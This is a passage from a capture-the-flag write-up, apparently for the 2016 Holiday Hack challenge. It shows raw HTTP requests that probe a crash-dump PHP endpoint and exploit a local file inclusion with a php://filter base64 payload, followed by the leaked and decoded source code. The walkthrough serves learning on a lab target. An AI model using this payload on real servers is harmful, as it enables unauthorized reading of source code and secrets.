&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;crashdump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:35:03 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;47&lt;/span&gt;

Fatal error! JSON key &amp;#39;crashdump&amp;#39; must be set.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, the server does not seem to like where we put our &lt;code&gt;crashdump&lt;/code&gt; key.
Maybe we should put it in the &lt;code&gt;data&lt;/code&gt; object?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;56&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;crashdump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;500&lt;/span&gt; &lt;span class="ne"&gt;Internal Server Error&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:36:09 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we got a 500 error. Our syntax seems to be correct, but the server
generated an error, probably because we didn't put anything in the
&lt;code&gt;crashdump&lt;/code&gt; key. Let's try to put one of our file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;76&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;crashdump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;crashdump-yoerjb.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:38:36 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;66&lt;/span&gt;

Fatal error! crashdump value duplicate &amp;#39;.php&amp;#39; extension detected.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We got a &amp;quot;fatal error&amp;quot;, but the web server returned a 200 OK code. This
probably means that we encountered an application error, but not an HTTP error.
The error message looks like there is custom filtering on the &lt;code&gt;crashdump&lt;/code&gt;
parameter. Filtering on &lt;code&gt;.php&lt;/code&gt; extensions seems like a filter against
Local File Inclusion. The &lt;code&gt;crashdump&lt;/code&gt; parameter is most likely used to
include one of the created crash dump file.&lt;/p&gt;
&lt;p&gt;Since &lt;code&gt;.php&lt;/code&gt; extensions seem to be filtered, this LFI seems a good
candidate for &lt;a class="reference external" href="http://php.net/manual/en/wrappers.php.php"&gt;PHP wrappers&lt;/a&gt;. PHP
wrappers are URL starting with &lt;code&gt;php://&lt;/code&gt;. They can be used to access
different I/O streams, and work on them directly. One of these wrappers, and
a very interesting one in the case of an LFI is the
&lt;a class="reference external" href="http://php.net/manual/en/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-unknown-unknown-unknown-descriptiot"&gt;filter&lt;/a&gt;
wrapper. The &lt;code&gt;filter&lt;/code&gt; wrapper can be used to manipulate files present on
the file system, and transform them (base64-encode, ROT13-encode, etc.). Since
the server seems to append &lt;code&gt;.php&lt;/code&gt; automatically to the &lt;code&gt;crashdump&lt;/code&gt;
parameter (cue the error message), we can use a &lt;code&gt;php://filter&lt;/code&gt; to read
files from the server, such as source code file. Let's try to read the
&lt;code&gt;exception.php&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;112&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;crashdump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;php://filter/read=convert.base64-encode/resource=exception&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:53:25 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;3168&lt;/span&gt;

PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bGF0b3IgaW4gd2Vicm9vdDogZGlzY29tYm9idWxhdGVkLWF1ZGlvLTYtWHl6RTNOOVlxS05ILm1wMwoKIyBDb2RlIGZyb20gaHR0cDovL3RoaXNpbnRlcmVzdHNtZS5jb20vcmVjZWl2aW5nLWpzb24tcG9zdC1kYXRhLXZpYS1waHAvCiMgTWFrZSBzdXJlIHRoYXQgaXQgaXMgYSBQT1NUIHJlcXVlc3QuCmlmKHN0cmNhc2VjbXAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10sICdQT1NUJykgIT0gMCl7CiAgICBkaWUoIlJlcXVlc3QgbWV0aG9kIG11c3QgYmUgUE9TVFxuIik7Cn0KCSAKIyBNYWtlIHN1cmUgdGhhdCB0aGUgY29udGVudCB0eXBlIG9mIHRoZSBQT1NUIHJlcXVlc3QgaGFzIGJlZW4gc2V0IHRvIGFwcGxpY2F0aW9uL2pzb24KJGNvbnRlbnRUeXBlID0gaXNzZXQoJF9TRVJWRVJbIkNPTlRFTlRfVFlQRSJdKSA/IHRyaW0oJF9TRVJWRVJbIkNPTlRFTlRfVFlQRSJdKSA6ICcnOwppZihzdHJjYXNlY21wKCRjb250ZW50VHlwZSwgJ2FwcGxpY2F0aW9uL2pzb24nKSAhPSAwKXsKICAgIGRpZSgiQ29udGVudCB0eXBlIG11c3QgYmU6IGFwcGxpY2F0aW9uL2pzb25cbiIpOwp9CgkKIyBHcmFiIHRoZSByYXcgUE9TVC4gTmVjZXNzYXJ5IGZvciBKU09OIGluIHBhcnRpY3VsYXIuCiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRvYmogPSBqc29uX2RlY29kZSgkY29udGVudCwgdHJ1ZSk7CgkjIElmIGpzb25fZGVjb2RlIGZhaWxlZCwgdGhlIEpTT04gaXMgaW52YWxpZC4KaWYoIWlzX2FycmF5KCRvYmopKXsKICAgIGRpZSgiUE9TVCBjb250YWlucyBpbnZhbGlkIEpTT04hXG4iKTsKfQoKIyBQcm9jZXNzIHRoZSBKU09OLgppZiAoICEgaXNzZXQoICRvYmpbJ29wZXJhdGlvbiddKSBvciAoCgkkb2JqWydvcGVyYXRpb24nXSAhPT0gIldyaXRlQ3Jhc2hEdW1wIiBhbmQKCSRvYmpbJ29wZXJhdGlvbiddICE9PSAiUmVhZENyYXNoRHVtcCIpKQoJewoJZGllKCJGYXRhbCBlcnJvciEgSlNPTiBrZXkgJ29wZXJhdGlvbicgbXVzdCBiZSBzZXQgdG8gV3JpdGVDcmFzaER1bXAgb3IgUmVhZENyYXNoRHVtcC5cbiIpOwp9CmlmICggaXNzZXQoJG9ialsnZGF0YSddKSkgewoJaWYgKCRvYmpbJ29wZXJhdGlvbiddID09PSAiV3JpdGVDcmFzaER1bXAiKSB7CgkJIyBXcml0ZSBhIG5ldyBjcmFzaCBkdW1wIHRvIGRpc2sKCQlwcm9jZXNzQ3Jhc2hEdW1wKCRvYmpbJ2RhdGEnXSk7Cgl9CgllbHNlaWYgKCRvYmpbJ29wZXJhdGlvbiddID09PSAiUmVhZENyYXNoRHVtcCIpIHsKCQkjIFJlYWQgYSBjcmFzaCBkdW1wIGJhY2sgZnJvbSBkaXNrCgkJcmVhZENyYXNoZHVtcCgkb2JqWydkYXRhJ10pOwoJfQp9CmVsc2UgewoJIyBkYXRhIGtleSB1bnNldAoJZGllKCJGYXRhbCBlcnJvciEgSlNPTiBrZXkgJ2RhdGEnIG11c3QgYmUgc2V0LlxuIik7Cn0KZnVuY3Rpb24gcHJvY2Vzc0NyYXNoZHVtcCgkY3Jhc2hkdW1wKSB7CgkkYmFzZXBhdGggPSAiL3Zhci93d3cvaHRtbC9kb2NzLyI7Cgkkb3V0cHV0ZmlsZW5hbWUgPSB0ZW1wbmFtKCRiYXNlcGF0aCwgImNyYXNoZHVtcC0iKTsKCXVubGluaygkb3V0cHV0ZmlsZW5hbWUpOwoJCgkkb3V0cHV0ZmlsZW5hbWUgPSAkb3V0cHV0ZmlsZW5hbWUgLiAiLnBocCI7CgkkYmFzZW5hbWUgPSBiYXNlbmFtZSgkb3V0cHV0ZmlsZW5hbWUpOwoJCgkkY3Jhc2hkdW1wX2VuY29kZWQgPSAiPD9waHAgcHJpbnQoJyIgLiBqc29uX2VuY29kZSgkY3Jhc2hkdW1wLCBKU09OX1BSRVRUWV9QUklOVCkgLiAiJyk7IjsKCWZpbGVfcHV0X2NvbnRlbnRzKCRvdXRwdXRmaWxlbmFtZSwgJGNyYXNoZHVtcF9lbmNvZGVkKTsKCQkJCglwcmludCA8PDxFTkQKewoJInN1Y2Nlc3MiIDogdHJ1ZSwKCSJmb2xkZXIiIDogImRvY3MiLAoJImNyYXNoZHVtcCIgOiAiJGJhc2VuYW1lIgp9CgpFTkQ7Cn0KZnVuY3Rpb24gcmVhZENyYXNoZHVtcCgkcmVxdWVzdGVkQ3Jhc2hkdW1wKSB7CgkkYmFzZXBhdGggPSAiL3Zhci93d3cvaHRtbC9kb2NzLyI7CgljaGRpcigkYmFzZXBhdGgpOwkJCgkKCWlmICggISBpc3NldCgkcmVxdWVzdGVkQ3Jhc2hkdW1wWydjcmFzaGR1bXAnXSkpIHsKCQlkaWUoIkZhdGFsIGVycm9yISBKU09OIGtleSAnY3Jhc2hkdW1wJyBtdXN0IGJlIHNldC5cbiIpOwoJfQoKCWlmICggc3Vic3RyKHN0cnJjaHIoJHJlcXVlc3RlZENyYXNoZHVtcFsnY3Jhc2hkdW1wJ10sICIuIiksIDEpID09PSAicGhwIiApIHsKCQlkaWUoIkZhdGFsIGVycm9yISBjcmFzaGR1bXAgdmFsdWUgZHVwbGljYXRlICcucGhwJyBleHRlbnNpb24gZGV0ZWN0ZWQuXG4iKTsKCX0KCWVsc2UgewoJCXJlcXVpcmUoJHJlcXVlc3RlZENyYXNoZHVtcFsnY3Jhc2hkdW1wJ10gLiAnLnBocCcpOwoJfQkKfQoKPz4K
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yes! We managed to get the source code of the &lt;code&gt;exception.php&lt;/code&gt; page,
encoded in base64. By decoding it, we have access to the source code, and we
can see how our data are treated:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="c1"&gt;# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/span&gt;
&lt;/span&gt;
&lt;span class="c1"&gt;# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/&lt;/span&gt;
&lt;span class="c1"&gt;# Make sure that it is a POST request.&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strcasecmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Request method must be POST&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;# Make sure that the content type of the POST request has been set to application/json&lt;/span&gt;
&lt;span class="nv"&gt;$contentType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;CONTENT_TYPE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="nb"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;CONTENT_TYPE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strcasecmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$contentType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content type must be: application/json&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;# Grab the raw POST. Necessary for JSON in particular.&lt;/span&gt;
&lt;span class="nv"&gt;$content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;php://input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nv"&gt;$obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;json_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;# If json_decode failed, the JSON is invalid.&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;is_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST contains invalid JSON!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;# Process the JSON.&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;and&lt;/span&gt;
    &lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fatal error! JSON key &amp;#39;operation&amp;#39; must be set to WriteCrashDump or ReadCrashDump.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;# Write a new crash dump to disk&lt;/span&gt;
        &lt;span class="nx"&gt;processCrashDump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
